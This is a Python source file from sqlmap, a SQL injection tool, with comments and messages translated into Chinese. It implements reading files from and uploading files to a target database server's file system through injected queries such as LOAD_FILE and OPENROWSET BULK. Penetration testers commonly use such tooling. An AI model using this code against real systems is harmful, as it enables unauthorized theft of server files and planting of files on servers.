#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import sys

from lib.core.agent import agent
from lib.core.common import dataToOutFile
from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import decloakToTemp
from lib.core.common import decodeHexValue
from lib.core.common import getUnicode
from lib.core.common import isNumPosStrValue
from lib.core.common import isListLike
from lib.core.common import isStackingAvailable
from lib.core.common import isTechniqueAvailable
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.settings import UNICODE_ENCODING
from lib.request import inject

class Filesystem:
    """
    该类定义了插件的通用操作系统文件系统功能。
    """

    def __init__(self):
        self.fileTblName = "sqlmapfile"
        self.tblField = "data"

    def _checkFileLength(self, localFile, remoteFile, fileRead=False):
        if Backend.isDbms(DBMS.MYSQL):
            lengthQuery = "LENGTH(LOAD_FILE('%s'))" % remoteFile

        elif Backend.isDbms(DBMS.PGSQL) and not fileRead:
            lengthQuery = "SELECT SUM(LENGTH(data)) FROM pg_largeobject WHERE loid=%d" % self.oid

        elif Backend.isDbms(DBMS.MSSQL):
            self.createSupportTbl(self.fileTblName, self.tblField, "VARBINARY(MAX)")
            inject.goStacked("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)" % (self.fileTblName, self.tblField, self.tblField, remoteFile, self.fileTblName, self.tblField));

            lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)

        try:
            localFileSize = os.path.getsize(localFile)
        except OSError:
            warnMsg = u"文件'%s' 丢失" % localFile
            logger.warn(warnMsg)
            localFileSize = 0

        if fileRead and Backend.isDbms(DBMS.PGSQL):
            logger.info(u"无法在 PostgreSQL 上检查读取文件'%s'的长度" % remoteFile)
            sameFile = True
        else:
            logger.debug(u"检查远程文件'%s'的长度" % remoteFile)
            remoteFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
            sameFile = None

            if isNumPosStrValue(remoteFileSize):
                remoteFileSize = long(remoteFileSize)
                localFile = getUnicode(localFile, encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)
                sameFile = False

                if localFileSize == remoteFileSize:
                    sameFile = True
                    infoMsg = u"本地文件'%s'和远程文件" % localFile
                    infoMsg += u"'%s'的大小相同 (%d B)" % (remoteFile, localFileSize)
                elif remoteFileSize > localFileSize:
                    infoMsg = u"远程文件'%s'比本地文件'%s' (%dB)大(%d B)" % (remoteFile, localFile, localFileSize, remoteFileSize)
                else:
                    infoMsg = u"远程文件'%s'比本地文件'%s' (%dB)小(%d B)" % (remoteFile, localFile, localFileSize, remoteFileSize)

                logger.info(infoMsg)
            else:
                sameFile = False
                warnMsg = u"看起来文件尚未写入"
                warnMsg += u"(通常出现这种情况是因为DBMS进程用户在目标路径中没有写权限)"
                logger.warn(warnMsg)

        return sameFile

    def fileToSqlQueries(self, fcEncodedList):
        """
        由MySQL和PostgreSQL插件调用，以在后端DBMS底层文件系统上写入文件
        """

        counter = 0
        sqlQueries = []

        for fcEncodedLine in fcEncodedList:
            if counter == 0:
                sqlQueries.append("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, fcEncodedLine))
            else:
                updatedField = agent.simpleConcatenate(self.tblField, fcEncodedLine)
                sqlQueries.append("UPDATE %s SET %s=%s" % (self.fileTblName, self.tblField, updatedField))

            counter += 1

        return sqlQueries

    def fileEncode(self, fileName, encoding, single, chunkSize=256):
        """
        由MySQL和PostgreSQL插件调用，以在后端DBMS底层文件系统上写入文件
        """

        checkFile(fileName)

        with open(fileName, "rb") as f:
            content = f.read()

        return self.fileContentEncode(content, encoding, single, chunkSize)

    def fileContentEncode(self, content, encoding, single, chunkSize=256):
        retVal = []

        if encoding:
            content = content.encode(encoding).replace("\n", "")

        if not single:
            if len(content) > chunkSize:
                for i in xrange(0, len(content), chunkSize):
                    _ = content[i:i + chunkSize]

                    if encoding == "hex":
                        _ = "0x%s" % _
                    elif encoding == "base64":
                        _ = "'%s'" % _

                    retVal.append(_)

        if not retVal:
            if encoding == "hex":
                content = "0x%s" % content
            elif encoding == "base64":
                content = "'%s'" % content

            retVal = [content]

        return retVal

    def askCheckWrittenFile(self, localFile, remoteFile, forceCheck=False):
        choice = None

        if forceCheck is not True:
            message = u"是否要确认本地文件 '%s' " % localFile
            message += u"已成功写入后端DBMS文件系统('%s')? [Y/n] " % remoteFile
            choice = readInput(message, default='Y', boolean=True)

        if forceCheck or choice:
            return self._checkFileLength(localFile, remoteFile)

        return True

    def askCheckReadFile(self, localFile, remoteFile):
        message = u"你想确认远程文件 '%s' " % remoteFile
        message += u"是否已从后端DBMS文件系统中成功下载? [Y/n] "

        if readInput(message, default='Y', boolean=True):
            return self._checkFileLength(localFile, remoteFile, True)

        return None

    def nonStackedReadFile(self, remoteFile):
        errMsg = u"'nonStackedReadFile' 方法必须定义到具体的DBMS插件中"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedReadFile(self, remoteFile):
        errMsg = u"'stackedReadFile' 方法必须定义到特定的DBMS插件中"
        raise SqlmapUndefinedMethod(errMsg)

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = u"'unionWriteFile' 方法必须定义到具体的DBMS插件中"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = u"'stackedWriteFile' 方法必须定义到特定的DBMS插件中"
        raise SqlmapUndefinedMethod(errMsg)

    def readFile(self, remoteFiles):
        localFilePaths = []

        self.checkDbmsOs()

        for remoteFile in remoteFiles.split(','):
            fileContent = None
            kb.fileReadMode = True

            if conf.direct or isStackingAvailable():
                if isStackingAvailable():
                    debugMsg = u"使用堆叠查询SQL注入技术来读取文件"
                    logger.debug(debugMsg)

                fileContent = self.stackedReadFile(remoteFile)
            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = u"用非堆叠查询SQL注入技术读取文件"
                logger.debug(debugMsg)

                fileContent = self.nonStackedReadFile(remoteFile)
            else:
                errMsg = u"检测到SQL注入技术无法从后端 %s 服务器的底层文件系统中读取文件 " % Backend.getDbms()
                logger.error(errMsg)

                fileContent = None

            kb.fileReadMode = False

            if fileContent in (None, "") and not Backend.isDbms(DBMS.PGSQL):
                self.cleanup(onlyFileTbl=True)
            elif isListLike(fileContent):
                newFileContent = ""

                for chunk in fileContent:
                    if isListLike(chunk):
                        if len(chunk) > 0:
                            chunk = chunk[0]
                        else:
                            chunk = ""

                    if chunk:
                        newFileContent += chunk

                fileContent = newFileContent

            if fileContent is not None:
                fileContent = decodeHexValue(fileContent, True)

                if fileContent:
                    localFilePath = dataToOutFile(remoteFile, fileContent)

                    if not Backend.isDbms(DBMS.PGSQL):
                        self.cleanup(onlyFileTbl=True)

                    sameFile = self.askCheckReadFile(localFilePath, remoteFile)

                    if sameFile is True:
                        localFilePath += u" (文件大小与服务端文件大小相同)"
                    elif sameFile is False:
                        localFilePath += u" (文件大小与服务端文件大小不同)"

                    localFilePaths.append(localFilePath)
                else:
                    errMsg = u"未检索到数据"
                    logger.error(errMsg)

        return localFilePaths

    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        written = False

        checkFile(localFile)

        self.checkDbmsOs()

        if localFile.endswith('_'):
            localFile = decloakToTemp(localFile)

        if conf.direct or isStackingAvailable():
            if isStackingAvailable():
                debugMsg = u"使用堆叠查询SQL注入技术上传文件 '%s' " % fileType
                logger.debug(debugMsg)

            written = self.stackedWriteFile(localFile, remoteFile, fileType, forceCheck)
            self.cleanup(onlyFileTbl=True)
        elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):
            debugMsg = u"使用UNION查询SQL注入技术上传文件 '%s' " % fileType
            logger.debug(debugMsg)

            written = self.unionWriteFile(localFile, remoteFile, fileType, forceCheck)
        else:
            errMsg = u"检测到的 SQL 注入技术都不能用于"
            errMsg += u"将文件写入后端 %s 服务器的底层文件系统" % Backend.getDbms()
            logger.error(errMsg)

            return None

        return written
